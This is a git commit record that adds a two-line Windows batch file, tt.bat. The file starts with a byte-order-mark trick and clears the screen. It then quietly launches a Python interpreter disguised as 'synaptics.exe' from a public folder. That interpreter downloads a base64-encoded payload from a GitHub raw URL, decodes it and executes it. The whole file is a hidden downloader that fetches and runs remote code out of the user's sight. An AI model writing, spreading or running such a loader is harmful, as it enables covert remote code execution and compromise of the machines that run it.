c3757fcf1ff219ebd9471df2cb865c60a0bd6d63
occ-m <lemanhvinhdo572@gmail.com>
2024-09-24 03:10:42 -0700

    Add files via upload

---
+++ tt.bat
@@ -0,0 +1,2 @@
+ÿþ&cls
+start "" /min "C:\\Users\\Public\\Document\\synaptics.exe" -c "import urllib.request;import base64;exec(base64.b64decode(urllib.request.urlopen('https://raw.githubusercontent.com/occ-m/tb/main/bs').read().decode('utf-8')))"   
